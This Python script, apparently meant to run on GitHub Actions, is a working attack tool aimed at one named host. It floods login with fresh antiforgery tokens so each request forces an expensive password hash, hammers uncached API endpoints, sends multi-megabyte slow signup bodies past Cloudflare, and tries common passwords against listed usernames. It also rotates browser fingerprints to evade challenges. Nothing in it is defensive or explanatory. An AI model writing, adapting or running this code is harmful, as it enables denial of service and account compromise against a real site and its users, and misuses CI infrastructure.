#!/usr/bin/env python3
"""HYDRA-LITE — self-contained runner for GitHub Actions.
Same doctrine as hydra.py v2: fresh antiforgery tokens so every login POST
reaches argon2, apisite DB hits with unique params, MRUDY bodies through CF.
Zero local deps beyond curl_cffi. Runs until job timeout kills it."""
import os, random, re, sys, threading, time
from curl_cffi import requests

HOST = "ech.qzz.io"
PORTS = [443, 2053, 2083, 2087, 2096, 8443]
IMPS = ["chrome124", "chrome120", "chrome116", "edge101", "safari184"]
UAS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"]
USERS = ["admin", "test", "user", "buddy200471", "Cat", "SnowyFlakess", "189",
         "Miltor", "BaconOld2016", "player1", "guest", "mak0dev", "Nicolas"]
PWS = ["password123", "hunter2", "letmein", "qwerty123", "admin123", "Password1!"]
DB = ["/apisite/games/v1/games/list?sortToken=popular&maxRows=100&keyword={k}",
      "/apisite/games/v1/games/multiget-place-details?placeIds={p}",
      "/apisite/users/v1/users/{id}",
      "/apisite/accountinformation/v1/users/{id}/details",
      "/apisite/friends/v1/users/{id}/friends/count",
      "/apisite/catalog/v1/search/items?Keyword={k}{k2}&Limit=120&SortType=3",
      "/apisite/catalog/v1/search/items/details?Keyword={k}&Limit=30&SortType=0"]
FORMS = ["/auth/signup", "/login", "/auth/password-reset"]
S = {"req": 0, "auth": 0, "db": 0, "mrudy": 0, "chall": 0, "err": 0}
_lock = threading.Lock()
_stop = False


def url(port):
    return f"https://{HOST}:{port}" if port != 443 else f"https://{HOST}"


def fresh_session():
    s = requests.Session(impersonate=random.choice(IMPS))
    s.headers["user-agent"] = random.choice(UAS)
    return s


def note(k):
    with _lock:
        S[k] = S.get(k, 0) + 1
        S["req"] += 1


def token(s):
    try:
        r = s.get(url(random.choice(PORTS)) + random.choice(FORMS), timeout=12)
        m = re.search(r'name="__RequestVerificationToken"[^>]*value="([^"]+)"', r.text or "")
        return m.group(1) if m else None
    except Exception:
        return None


def worker():
    global _stop
    s = fresh_session()
    n = 0
    while not _stop:
        try:
            roll = random.random()
            if roll < 0.45:
                t = token(s)
                if t:
                    r = s.post(url(random.choice(PORTS)) + "/login",
                               data={"__RequestVerificationToken": t,
                                     "username": random.choice(USERS),
                                     "password": random.choice(PWS)},
                               timeout=15,
                               headers={"referer": f"https://{HOST}/login", "origin": f"https://{HOST}"})
                    note("auth")
                    if r.status_code in (403, 429, 503):
                        with _lock:
                            S["chall"] += 1
                        s = fresh_session()
                        time.sleep(random.uniform(2, 8))
            elif roll < 0.75:
                tpl = random.choice(DB)
                p = (tpl.replace("{k2}", f"{random.getrandbits(32):08x}")
                        .replace("{k}", f"{random.getrandbits(32):08x}")
                        .replace("{p}", f"{random.randint(1,999)},{random.randint(1,999)}")
                        .replace("{id}", str(random.randint(1, 3000))))
                s.get(url(random.choice(PORTS)) + p, timeout=15,
                      headers={"referer": f"https://{HOST}/games", "accept": "application/json"})
                note("db")
            else:
                blob = "z" * random.randint(2 * 1024 * 1024, 6 * 1024 * 1024)
                s.post(url(random.choice(PORTS)) + "/auth/signup",
                       data={"__RequestVerificationToken": "CfDJ8" + "z" * 140,
                             "username": f"user{random.getrandbits(24):06x}",
                             "password": "Testpass123!", "passwordConfirm": "Testpass123!",
                             "h-captcha-response": blob[:200], "junk": blob},
                       timeout=60)
                note("mrudy")
            n += 1
            if n % random.randint(40, 120) == 0:
                s = fresh_session()
            time.sleep(random.uniform(0.01, 0.15))
        except Exception:
            with _lock:
                S["err"] += 1
            time.sleep(random.uniform(1, 5))
            s = fresh_session()


def status():
    while not _stop:
        with _lock:
            snap = dict(S)
        print(f"gh-hydra: {snap}", flush=True)
        time.sleep(30)


def main():
    heads = int(os.environ.get("HYDRA_HEADS", "6"))
    threading.Thread(target=status, daemon=True).start()
    for _ in range(heads):
        threading.Thread(target=worker, daemon=True).start()
        time.sleep(0.3)
    print(f"gh-hydra: {heads} heads live", flush=True)
    while True:
        time.sleep(5)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        _stop = True
